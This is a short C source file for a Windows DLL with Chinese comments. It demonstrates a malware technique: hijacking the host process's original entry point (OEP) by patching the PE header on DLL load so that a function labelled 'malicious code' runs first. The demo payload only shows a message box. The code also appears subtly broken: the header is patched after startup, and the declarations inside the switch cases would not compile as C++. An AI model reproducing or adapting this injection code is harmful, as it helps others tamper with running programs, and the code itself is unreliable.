#include <windows.h>

// 声明原始OEP函数指针
typedef void (*OriginalEntryPointType)();

// 定义原始OEP函数指针
OriginalEntryPointType OriginalEntryPoint;

// 恶意代码
void MaliciousCode() {
    MessageBox(NULL, "OEP Hijacked!", "Alert", MB_OK);

    // 恢复原始OEP，继续执行合法代码
    OriginalEntryPoint();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // 查找并修改OEP
        HMODULE hModule = GetModuleHandle(NULL);
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);

        // 保存原始OEP
        OriginalEntryPoint = (OriginalEntryPointType)((BYTE*)hModule + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

        // 修改OEP指向恶意代码
        DWORD oldProtect;
        VirtualProtect(&pNtHeaders->OptionalHeader.AddressOfEntryPoint, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &oldProtect);
        pNtHeaders->OptionalHeader.AddressOfEntryPoint = (DWORD)((BYTE*)MaliciousCode - (BYTE*)hModule);
        VirtualProtect(&pNtHeaders->OptionalHeader.AddressOfEntryPoint, sizeof(DWORD), oldProtect, &oldProtect);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
